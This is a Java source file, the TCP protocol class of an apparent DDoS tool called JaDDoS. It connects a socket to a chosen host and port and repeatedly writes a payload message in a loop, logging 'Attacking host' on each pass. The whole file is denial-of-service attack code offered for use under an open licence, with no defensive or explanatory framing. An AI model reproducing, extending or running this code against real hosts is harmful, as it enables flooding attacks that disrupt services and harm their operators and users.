/***
 * Copyright (c) 2021 Shehan Dhaleesha
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 * 
 */

package com.jaddos.protocol;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import org.apache.log4j.Logger;

import com.jaddos.core.JaDDoS;
import com.jaddos.core.JaDDoSPattern;

/**
 * Class implementation of TCP protocol
 * 
 * @author ShehanD
 *
 */
public class JaDDoSTCPProtocol extends JaDDoS implements IJaDDoSTCPProtocol {

	/** Logger instance */
	private Logger logger = Logger.getLogger(JaDDoSTCPProtocol.class);
	
	/** Instance of the current socket. */
	private Socket socket;

	/**
	 * Create a JaDDoSTCPProtocol DDOS with a specified DDOS Pattern.
	 * 
	 * @param ddosPattern
	 */
	public JaDDoSTCPProtocol(JaDDoSPattern ddosPattern) {
		super(ddosPattern);
	}

	@Override
	public void run() {

		createSocket();
		connectToSocket();

		while (!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed())) {
			writeLineToSocket(getDdosPattern().getMessage());
			logger.info("Attacking host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());

			try {
				Thread.sleep(getDdosPattern().getTimeout());
			} catch (InterruptedException e) {
				logger.error("Unable to perform the attack: " + e.getMessage(), e);
			}
		}

		closeSocket();

	}

	@Override
	public void writeLineToSocket(String message) {
		try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(getSocket().getOutputStream()))) {
			bw.write(getDdosPattern().getMessage());
			bw.flush();
		} catch (IOException e) {
			logger.error("There has been error while writing to the buffer: " + e.getMessage(), e);
		}
	}

	@Override
	protected void createSocket() {
		setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
		socket = new Socket();

		try {
			socket.setKeepAlive(true);
			socket.setSoTimeout(getDdosPattern().getSocketTimeout());
		} catch (SocketException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}
	}

	@Override
	protected void connectToSocket() {
		try {
			if (socket != null) {
				socket.connect(getAddress());
			}
		} catch (UnknownHostException e) {
			logger.error("Host " + getAddress() + " doesn´t exist!", e);
		} catch (SocketException e) {
			logger.error("Error while creating or accessing a Socket. Socket Error: " + e.getMessage(), e);
			closeSocket();
		} catch (IOException e) {
			logger.error("Error while creating or accessing a Socket. IO Error: " + e.getMessage(), e);
		}

	}

	@Override
	protected void closeSocket() {
		try {
			if (socket != null && !socket.isClosed() && socket.isBound()) {
				socket.close();
			}
		} catch (IOException e) {
			logger.error("Can not close the socket: " + e.getMessage(), e);
		}
	}

	@Override
	public Socket getSocket() {
		return socket;
	}

	@Override
	public void setSocket(Socket socket) {
		this.socket = socket;

	}

}
